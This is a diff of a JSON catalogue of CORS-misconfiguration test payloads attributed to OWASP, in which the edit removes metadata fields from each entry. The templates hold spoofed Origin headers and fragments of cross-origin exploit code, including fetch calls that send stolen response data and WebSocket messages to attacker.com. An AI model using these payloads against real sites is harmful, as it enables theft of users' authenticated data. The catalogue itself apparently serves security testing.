@@ -3,1278 +3,852 @@
     "id": "cors-misconfiguration-owasp-0001",
     "name": "Basic Origin testing",
     "template": "Origin: https://evil.com",
-    "description": "Basic Origin testing probe from OWASP. Tests application handling of: Origin: https://evil.com",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Basic Origin testing probe from OWASP. Tests application handling of: Origin: https://evil.com"
   },
   {
     "id": "cors-misconfiguration-owasp-0002",
     "name": "Basic Origin testing #2",
     "template": "Origin: http://evil.com",
-    "description": "Basic Origin testing probe from OWASP. Tests application handling of: Origin: http://evil.com",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Basic Origin testing probe from OWASP. Tests application handling of: Origin: http://evil.com"
   },
   {
     "id": "cors-misconfiguration-owasp-0003",
     "name": "Basic Origin testing #3",
     "template": "Origin: https://attacker.com",
-    "description": "Basic Origin testing probe from OWASP. Tests application handling of: Origin: https://attacker.com",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Basic Origin testing probe from OWASP. Tests application handling of: Origin: https://attacker.com"
   },
   {
     "id": "cors-misconfiguration-owasp-0004",
     "name": "Basic Origin testing #4",
     "template": "Origin: http://attacker.com",
-    "description": "Basic Origin testing probe from OWASP. Tests application handling of: Origin: http://attacker.com",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Basic Origin testing probe from OWASP. Tests application handling of: Origin: http://attacker.com"
   },
   {
     "id": "cors-misconfiguration-owasp-0005",
     "name": "Null Origin (works in sandboxed iframes)",
     "template": "Origin: null",
-    "description": "Null Origin (works in sandboxed iframes) probe from OWASP. Tests application handling of: Origin: null",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Null Origin (works in sandboxed iframes) probe from OWASP. Tests application handling of: Origin: null"
   },
   {
     "id": "cors-misconfiguration-owasp-0006",
     "name": "Subdomain variations",
     "template": "Origin: https://evil.target.com",
-    "description": "Subdomain variations probe from OWASP. Tests application handling of: Origin: https://evil.target.co...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Subdomain variations probe from OWASP. Tests application handling of: Origin: https://evil.target.co..."
   },
   {
     "id": "cors-misconfiguration-owasp-0007",
     "name": "Subdomain variations #2",
     "template": "Origin: https://target.com.evil.com",
-    "description": "Subdomain variations probe from OWASP. Tests application handling of: Origin: https://target.com.evi...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Subdomain variations probe from OWASP. Tests application handling of: Origin: https://target.com.evi..."
   },
   {
     "id": "cors-misconfiguration-owasp-0008",
     "name": "Subdomain variations #3",
     "template": "Origin: https://subtarget.com",
-    "description": "Subdomain variations probe from OWASP. Tests application handling of: Origin: https://subtarget.com",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Subdomain variations probe from OWASP. Tests application handling of: Origin: https://subtarget.com"
   },
   {
     "id": "cors-misconfiguration-owasp-0009",
     "name": "Subdomain variations #4",
     "template": "Origin: https://admin.target.com",
-    "description": "Subdomain variations probe from OWASP. Tests application handling of: Origin: https://admin.target.c...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Subdomain variations probe from OWASP. Tests application handling of: Origin: https://admin.target.c..."
   },
   {
     "id": "cors-misconfiguration-owasp-0010",
     "name": "Subdomain variations #5",
     "template": "Origin: https://api.target.com",
-    "description": "Subdomain variations probe from OWASP. Tests application handling of: Origin: https://api.target.com",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Subdomain variations probe from OWASP. Tests application handling of: Origin: https://api.target.com"
   },
   {
     "id": "cors-misconfiguration-owasp-0011",
     "name": "Pre-domain bypass",
     "template": "Origin: https://wwwtarget.com",
-    "description": "Pre-domain bypass probe from OWASP. Tests application handling of: Origin: https://wwwtarget.com",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Pre-domain bypass probe from OWASP. Tests application handling of: Origin: https://wwwtarget.com"
   },
   {
     "id": "cors-misconfiguration-owasp-0012",
     "name": "Pre-domain bypass #2",
     "template": "Origin: https://not-target.com",
-    "description": "Pre-domain bypass probe from OWASP. Tests application handling of: Origin: https://not-target.com",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Pre-domain bypass probe from OWASP. Tests application handling of: Origin: https://not-target.com"
   },
   {
     "id": "cors-misconfiguration-owasp-0013",
     "name": "Pre-domain bypass #3",
     "template": "Origin: https://target.com-evil.com",
-    "description": "Pre-domain bypass probe from OWASP. Tests application handling of: Origin: https://target.com-evi...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Pre-domain bypass probe from OWASP. Tests application handling of: Origin: https://target.com-evi..."
   },
   {
     "id": "cors-misconfiguration-owasp-0014",
     "name": "Pre-domain bypass #4",
     "template": "Origin: https://target.com.attacker.com",
-    "description": "Pre-domain bypass probe from OWASP. Tests application handling of: Origin: https://target.com.att...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Pre-domain bypass probe from OWASP. Tests application handling of: Origin: https://target.com.att..."
   },
   {
     "id": "cors-misconfiguration-owasp-0015",
     "name": "Post-domain bypass",
     "template": "Origin: https://evil-target.com",
-    "description": "Post-domain bypass probe from OWASP. Tests application handling of: Origin: https://evil-target.co...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Post-domain bypass probe from OWASP. Tests application handling of: Origin: https://evil-target.co..."
   },
   {
     "id": "cors-misconfiguration-owasp-0016",
     "name": "Post-domain bypass #2",
     "template": "Origin: https://eviltarget.com",
-    "description": "Post-domain bypass probe from OWASP. Tests application handling of: Origin: https://eviltarget.com",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Post-domain bypass probe from OWASP. Tests application handling of: Origin: https://eviltarget.com"
   },
   {
     "id": "cors-misconfiguration-owasp-0017",
     "name": "Protocol variations",
     "template": "Origin: http://target.com",
-    "description": "Protocol variations probe from OWASP. Tests application handling of: Origin: http://target.com",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Protocol variations probe from OWASP. Tests application handling of: Origin: http://target.com"
   },
   {
     "id": "cors-misconfiguration-owasp-0018",
     "name": "Protocol variations #2",
     "template": "Origin: https://target.com",
-    "description": "Protocol variations probe from OWASP. Tests application handling of: Origin: https://target.com",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Protocol variations probe from OWASP. Tests application handling of: Origin: https://target.com"
   },
   {
     "id": "cors-misconfiguration-owasp-0019",
     "name": "Protocol variations #3",
     "template": "Origin: ftp://target.com",
-    "description": "Protocol variations probe from OWASP. Tests application handling of: Origin: ftp://target.com",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Protocol variations probe from OWASP. Tests application handling of: Origin: ftp://target.com"
   },
   {
     "id": "cors-misconfiguration-owasp-0020",
     "name": "Protocol variations #4",
     "template": "Origin: file://target.com",
-    "description": "Protocol variations probe from OWASP. Tests application handling of: Origin: file://target.com",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Protocol variations probe from OWASP. Tests application handling of: Origin: file://target.com"
   },
   {
     "id": "cors-misconfiguration-owasp-0021",
     "name": "Port variations",
     "template": "Origin: https://target.com:8080",
-    "description": "Port variations probe from OWASP. Tests application handling of: Origin: https://target.com:808...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Port variations probe from OWASP. Tests application handling of: Origin: https://target.com:808..."
   },
   {
     "id": "cors-misconfiguration-owasp-0022",
     "name": "Port variations #2",
     "template": "Origin: https://target.com:8443",
-    "description": "Port variations probe from OWASP. Tests application handling of: Origin: https://target.com:844...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Port variations probe from OWASP. Tests application handling of: Origin: https://target.com:844..."
   },
   {
     "id": "cors-misconfiguration-owasp-0023",
     "name": "Port variations #3",
     "template": "Origin: https://target.com:443",
-    "description": "Port variations probe from OWASP. Tests application handling of: Origin: https://target.com:443",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Port variations probe from OWASP. Tests application handling of: Origin: https://target.com:443"
   },
   {
     "id": "cors-misconfiguration-owasp-0024",
     "name": "Port variations #4",
     "template": "Origin: https://target.com:80",
-    "description": "Port variations probe from OWASP. Tests application handling of: Origin: https://target.com:80",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Port variations probe from OWASP. Tests application handling of: Origin: https://target.com:80"
   },
   {
     "id": "cors-misconfiguration-owasp-0025",
     "name": "Case sensitivity bypass",
     "template": "Origin: https://TARGET.COM",
-    "description": "Case sensitivity bypass probe from OWASP. Tests application handling of: Origin: https://TARGET.COM",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Case sensitivity bypass probe from OWASP. Tests application handling of: Origin: https://TARGET.COM"
   },
   {
     "id": "cors-misconfiguration-owasp-0026",
     "name": "Case sensitivity bypass #2",
     "template": "Origin: https://Target.Com",
-    "description": "Case sensitivity bypass probe from OWASP. Tests application handling of: Origin: https://Target.Com",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Case sensitivity bypass probe from OWASP. Tests application handling of: Origin: https://Target.Com"
   },
   {
     "id": "cors-misconfiguration-owasp-0027",
     "name": "Case sensitivity bypass #3",
     "template": "Origin: https://TaRgEt.CoM",
-    "description": "Case sensitivity bypass probe from OWASP. Tests application handling of: Origin: https://TaRgEt.CoM",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Case sensitivity bypass probe from OWASP. Tests application handling of: Origin: https://TaRgEt.CoM"
   },
   {
     "id": "cors-misconfiguration-owasp-0028",
     "name": "Underscore in subdomain",
     "template": "Origin: https://evil_admin.target.com",
-    "description": "Underscore in subdomain probe from OWASP. Tests application handling of: Origin: https://evil_admin.tar...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Underscore in subdomain probe from OWASP. Tests application handling of: Origin: https://evil_admin.tar..."
   },
   {
     "id": "cors-misconfiguration-owasp-0029",
     "name": "Underscore in subdomain #2",
     "template": "Origin: https://admin_.target.com",
-    "description": "Underscore in subdomain probe from OWASP. Tests application handling of: Origin: https://admin_.target....",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Underscore in subdomain probe from OWASP. Tests application handling of: Origin: https://admin_.target...."
   },
   {
     "id": "cors-misconfiguration-owasp-0030",
     "name": "Special characters",
     "template": "Origin: https://target.com%0d%0aEvil: header",
-    "description": "Special characters probe from OWASP. Tests application handling of: Origin: https://target.com%0d%...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Special characters probe from OWASP. Tests application handling of: Origin: https://target.com%0d%..."
   },
   {
     "id": "cors-misconfiguration-owasp-0031",
     "name": "Special characters #2",
     "template": "Origin: https://target.com%00.evil.com",
-    "description": "Special characters probe from OWASP. Tests application handling of: Origin: https://target.com%00....",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Special characters probe from OWASP. Tests application handling of: Origin: https://target.com%00...."
   },
   {
     "id": "cors-misconfiguration-owasp-0032",
     "name": "Special characters #3",
     "template": "Origin: https://target.com@evil.com",
-    "description": "Special characters probe from OWASP. Tests application handling of: Origin: https://target.com@evi...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Special characters probe from OWASP. Tests application handling of: Origin: https://target.com@evi..."
   },
   {
     "id": "cors-misconfiguration-owasp-0033",
     "name": "Special characters #4",
     "template": "Origin: https://evil@target.com",
-    "description": "Special characters probe from OWASP. Tests application handling of: Origin: https://evil@target.co...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Special characters probe from OWASP. Tests application handling of: Origin: https://evil@target.co..."
   },
   {
     "id": "cors-misconfiguration-owasp-0034",
     "name": "Regex bypass patterns",
     "template": "Origin: https://evil.target.com.net",
-    "description": "Regex bypass patterns probe from OWASP. Tests application handling of: Origin: https://evil.target.co...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Regex bypass patterns probe from OWASP. Tests application handling of: Origin: https://evil.target.co..."
   },
   {
     "id": "cors-misconfiguration-owasp-0035",
     "name": "Regex bypass patterns #2",
     "template": "Origin: https://atarget.com",
-    "description": "Regex bypass patterns probe from OWASP. Tests application handling of: Origin: https://atarget.com",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Regex bypass patterns probe from OWASP. Tests application handling of: Origin: https://atarget.com"
   },
   {
     "id": "cors-misconfiguration-owasp-0036",
     "name": "Regex bypass patterns #3",
     "template": "Origin: https://target.com.de",
-    "description": "Regex bypass patterns probe from OWASP. Tests application handling of: Origin: https://target.com.de",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Regex bypass patterns probe from OWASP. Tests application handling of: Origin: https://target.com.de"
   },
   {
     "id": "cors-misconfiguration-owasp-0037",
     "name": "Regex bypass patterns #4",
     "template": "Origin: https://target.co.uk",
-    "description": "Regex bypass patterns probe from OWASP. Tests application handling of: Origin: https://target.co.uk",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Regex bypass patterns probe from OWASP. Tests application handling of: Origin: https://target.co.uk"
   },
   {
     "id": "cors-misconfiguration-owasp-0038",
     "name": "Regex bypass patterns #5",
     "template": "Origin: https://target.org",
-    "description": "Regex bypass patterns probe from OWASP. Tests application handling of: Origin: https://target.org",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Regex bypass patterns probe from OWASP. Tests application handling of: Origin: https://target.org"
   },
   {
     "id": "cors-misconfiguration-owasp-0039",
     "name": "Localhost variations",
     "template": "Origin: http://localhost",
-    "description": "Localhost variations probe from OWASP. Tests application handling of: Origin: http://localhost",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Localhost variations probe from OWASP. Tests application handling of: Origin: http://localhost"
   },
   {
     "id": "cors-misconfiguration-owasp-0040",
     "name": "Localhost variations #2",
     "template": "Origin: http://127.0.0.1",
-    "description": "Localhost variations probe from OWASP. Tests application handling of: Origin: http://127.0.0.1",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Localhost variations probe from OWASP. Tests application handling of: Origin: http://127.0.0.1"
   },
   {
     "id": "cors-misconfiguration-owasp-0041",
     "name": "Localhost variations #3",
     "template": "Origin: http://0.0.0.0",
-    "description": "Localhost variations probe from OWASP. Tests application handling of: Origin: http://0.0.0.0",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Localhost variations probe from OWASP. Tests application handling of: Origin: http://0.0.0.0"
   },
   {
     "id": "cors-misconfiguration-owasp-0042",
     "name": "Localhost variations #4",
     "template": "Origin: http://[::1]",
-    "description": "Localhost variations probe from OWASP. Tests application handling of: Origin: http://[::1]",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Localhost variations probe from OWASP. Tests application handling of: Origin: http://[::1]"
   },
   {
     "id": "cors-misconfiguration-owasp-0043",
     "name": "Localhost variations #5",
     "template": "Origin: http://localhost.target.com",
-    "description": "Localhost variations probe from OWASP. Tests application handling of: Origin: http://localhost.targe...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Localhost variations probe from OWASP. Tests application handling of: Origin: http://localhost.targe..."
   },
   {
     "id": "cors-misconfiguration-owasp-0044",
     "name": "File protocol",
     "template": "Origin: file://",
-    "description": "File protocol probe from OWASP. Tests application handling of: Origin: file://",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "File protocol probe from OWASP. Tests application handling of: Origin: file://"
   },
   {
     "id": "cors-misconfiguration-owasp-0045",
     "name": "File protocol #2",
     "template": "Origin: file:///etc/passwd",
-    "description": "File protocol probe from OWASP. Tests application handling of: Origin: file:///etc/passwd",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "File protocol probe from OWASP. Tests application handling of: Origin: file:///etc/passwd"
   },
   {
     "id": "cors-misconfiguration-owasp-0046",
     "name": "Wildcard subdomain bypass",
     "template": "Origin: https://anything.target.com",
-    "description": "Wildcard subdomain bypass probe from OWASP. Tests application handling of: Origin: https://anything.targe...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Wildcard subdomain bypass probe from OWASP. Tests application handling of: Origin: https://anything.targe..."
   },
   {
     "id": "cors-misconfiguration-owasp-0047",
     "name": "Wildcard subdomain bypass #2",
     "template": "Origin: https://xyz123.target.com",
-    "description": "Wildcard subdomain bypass probe from OWASP. Tests application handling of: Origin: https://xyz123.target....",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Wildcard subdomain bypass probe from OWASP. Tests application handling of: Origin: https://xyz123.target...."
   },
   {
     "id": "cors-misconfiguration-owasp-0048",
     "name": "Wildcard subdomain bypass #3",
     "template": "Origin: https://hacker.target.com",
-    "description": "Wildcard subdomain bypass probe from OWASP. Tests application handling of: Origin: https://hacker.target....",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Wildcard subdomain bypass probe from OWASP. Tests application handling of: Origin: https://hacker.target...."
   },
   {
     "id": "cors-misconfiguration-owasp-0049",
     "name": "Pre-flight request headers",
     "template": "Access-Control-Request-Method: POST",
-    "description": "Pre-flight request headers probe from OWASP. Tests application handling of: Access-Control-Request-Method:...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Pre-flight request headers probe from OWASP. Tests application handling of: Access-Control-Request-Method:..."
   },
   {
     "id": "cors-misconfiguration-owasp-0050",
     "name": "Pre-flight request headers #2",
     "template": "Access-Control-Request-Method: PUT",
-    "description": "Pre-flight request headers probe from OWASP. Tests application handling of: Access-Control-Request-Method:...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Pre-flight request headers probe from OWASP. Tests application handling of: Access-Control-Request-Method:..."
   },
   {
     "id": "cors-misconfiguration-owasp-0051",
     "name": "Pre-flight request headers #3",
     "template": "Access-Control-Request-Method: DELETE",
-    "description": "Pre-flight request headers probe from OWASP. Tests application handling of: Access-Control-Request-Method:...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Pre-flight request headers probe from OWASP. Tests application handling of: Access-Control-Request-Method:..."
   },
   {
     "id": "cors-misconfiguration-owasp-0052",
     "name": "Pre-flight request headers #4",
     "template": "Access-Control-Request-Method: PATCH",
-    "description": "Pre-flight request headers probe from OWASP. Tests application handling of: Access-Control-Request-Method:...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Pre-flight request headers probe from OWASP. Tests application handling of: Access-Control-Request-Method:..."
   },
   {
     "id": "cors-misconfiguration-owasp-0053",
     "name": "Pre-flight request headers #5",
     "template": "Access-Control-Request-Headers: X-Custom-Header",
-    "description": "Pre-flight request headers probe from OWASP. Tests application handling of: Access-Control-Request-Headers...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Pre-flight request headers probe from OWASP. Tests application handling of: Access-Control-Request-Headers..."
   },
   {
     "id": "cors-misconfiguration-owasp-0054",
     "name": "Pre-flight request headers #6",
     "template": "Access-Control-Request-Headers: Authorization",
-    "description": "Pre-flight request headers probe from OWASP. Tests application handling of: Access-Control-Request-Headers...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Pre-flight request headers probe from OWASP. Tests application handling of: Access-Control-Request-Headers..."
   },
   {
     "id": "cors-misconfiguration-owasp-0055",
     "name": "Pre-flight request headers #7",
     "template": "Access-Control-Request-Headers: Content-Type",
-    "description": "Pre-flight request headers probe from OWASP. Tests application handling of: Access-Control-Request-Headers...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Pre-flight request headers probe from OWASP. Tests application handling of: Access-Control-Request-Headers..."
   },
   {
     "id": "cors-misconfiguration-owasp-0056",
     "name": "For use when CORS is misconfigured",
     "template": "var req = new XMLHttpRequest();",
-    "description": "For use when CORS is misconfigured probe from OWASP. Tests application handling of: var req = new XMLHttpRequest()...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "For use when CORS is misconfigured probe from OWASP. Tests application handling of: var req = new XMLHttpRequest()..."
   },
   {
     "id": "cors-misconfiguration-owasp-0057",
     "name": "For use when CORS is misconfigured #2",
     "template": "req.open('GET', 'https://target.com/api/user/data', true);",
-    "description": "For use when CORS is misconfigured probe from OWASP. Tests application handling of: req.open('GET', 'https://targe...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "For use when CORS is misconfigured probe from OWASP. Tests application handling of: req.open('GET', 'https://targe..."
   },
   {
     "id": "cors-misconfiguration-owasp-0058",
     "name": "For use when CORS is misconfigured #3",
     "template": "req.withCredentials = true;",
-    "description": "For use when CORS is misconfigured probe from OWASP. Tests application handling of: req.withCredentials = true;",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "For use when CORS is misconfigured probe from OWASP. Tests application handling of: req.withCredentials = true;"
   },
   {
     "id": "cors-misconfiguration-owasp-0059",
     "name": "For use when CORS is misconfigured #4",
     "template": "req.onload = function() {",
-    "description": "For use when CORS is misconfigured probe from OWASP. Tests application handling of: req.onload = function() {",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "For use when CORS is misconfigured probe from OWASP. Tests application handling of: req.onload = function() {"
   },
   {
     "id": "cors-misconfiguration-owasp-0060",
     "name": "For use when CORS is misconfigured #5",
     "template": "fetch('https://attacker.com/steal?data=' + btoa(req.responseText));",
-    "description": "For use when CORS is misconfigured probe from OWASP. Tests application handling of: fetch('https://attacker.com/st...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "For use when CORS is misconfigured probe from OWASP. Tests application handling of: fetch('https://attacker.com/st..."
   },
   {
     "id": "cors-misconfiguration-owasp-0061",
     "name": "For use when CORS is misconfigured #6",
     "template": "};",
-    "description": "For use when CORS is misconfigured probe from OWASP. Tests application handling of: };",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "For use when CORS is misconfigured probe from OWASP. Tests application handling of: };"
   },
   {
     "id": "cors-misconfiguration-owasp-0062",
     "name": "For use when CORS is misconfigured #7",
     "template": "req.send();",
-    "description": "For use when CORS is misconfigured probe from OWASP. Tests application handling of: req.send();",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "For use when CORS is misconfigured probe from OWASP. Tests application handling of: req.send();"
   },
   {
     "id": "cors-misconfiguration-owasp-0063",
     "name": "Fetch API exploitation",
     "template": "fetch('https://target.com/api/sensitive', {",
-    "description": "Fetch API exploitation probe from OWASP. Tests application handling of: fetch('https://target.com/api/...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Fetch API exploitation probe from OWASP. Tests application handling of: fetch('https://target.com/api/..."
   },
   {
     "id": "cors-misconfiguration-owasp-0064",
     "name": "Fetch API exploitation #2",
     "template": "credentials: 'include'",
-    "description": "Fetch API exploitation probe from OWASP. Tests application handling of: credentials: 'include'",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Fetch API exploitation probe from OWASP. Tests application handling of: credentials: 'include'"
   },
   {
     "id": "cors-misconfiguration-owasp-0065",
     "name": "Fetch API exploitation #3",
     "template": "}).then(r => r.text()).then(data => {",
-    "description": "Fetch API exploitation probe from OWASP. Tests application handling of: }).then(r => r.text()).then(da...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Fetch API exploitation probe from OWASP. Tests application handling of: }).then(r => r.text()).then(da..."
   },
   {
     "id": "cors-misconfiguration-owasp-0066",
     "name": "Fetch API exploitation #4",
     "template": "fetch('https://attacker.com/log?data=' + btoa(data));",
-    "description": "Fetch API exploitation probe from OWASP. Tests application handling of: fetch('https://attacker.com/lo...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Fetch API exploitation probe from OWASP. Tests application handling of: fetch('https://attacker.com/lo..."
   },
   {
     "id": "cors-misconfiguration-owasp-0067",
     "name": "Fetch API exploitation #5",
     "template": "});",
-    "description": "Fetch API exploitation probe from OWASP. Tests application handling of: });",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Fetch API exploitation probe from OWASP. Tests application handling of: });"
   },
   {
     "id": "cors-misconfiguration-owasp-0068",
     "name": "Testing for credential exposure",
     "template": "GET /api/user HTTP/1.1",
-    "description": "Testing for credential exposure probe from OWASP. Tests application handling of: GET /api/user HTTP/1.1",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Testing for credential exposure probe from OWASP. Tests application handling of: GET /api/user HTTP/1.1"
   },
   {
     "id": "cors-misconfiguration-owasp-0069",
     "name": "Testing for credential exposure #2",
     "template": "Host: target.com",
-    "description": "Testing for credential exposure probe from OWASP. Tests application handling of: Host: target.com",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Testing for credential exposure probe from OWASP. Tests application handling of: Host: target.com"
   },
   {
     "id": "cors-misconfiguration-owasp-0070",
     "name": "Testing for credential exposure #3",
     "template": "Cookie: session=abc123",
-    "description": "Testing for credential exposure probe from OWASP. Tests application handling of: Cookie: session=abc123",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Testing for credential exposure probe from OWASP. Tests application handling of: Cookie: session=abc123"
   },
   {
     "id": "cors-misconfiguration-owasp-0071",
     "name": "WebSocket CORS bypass",
     "template": "var ws = new WebSocket('wss://target.com/socket');",
-    "description": "WebSocket CORS bypass probe from OWASP. Tests application handling of: var ws = new WebSocket('wss://...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "WebSocket CORS bypass probe from OWASP. Tests application handling of: var ws = new WebSocket('wss://..."
   },
   {
     "id": "cors-misconfiguration-owasp-0072",
     "name": "WebSocket CORS bypass #2",
     "template": "ws.onmessage = function(event) {",
-    "description": "WebSocket CORS bypass probe from OWASP. Tests application handling of: ws.onmessage = function(event)...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "WebSocket CORS bypass probe from OWASP. Tests application handling of: ws.onmessage = function(event)..."
   },
   {
     "id": "cors-misconfiguration-owasp-0073",
     "name": "WebSocket CORS bypass #3",
     "template": "fetch('https://attacker.com/log?data=' + btoa(event.data));",
-    "description": "WebSocket CORS bypass probe from OWASP. Tests application handling of: fetch('https://attacker.com/lo...",
-    "enabled": true,
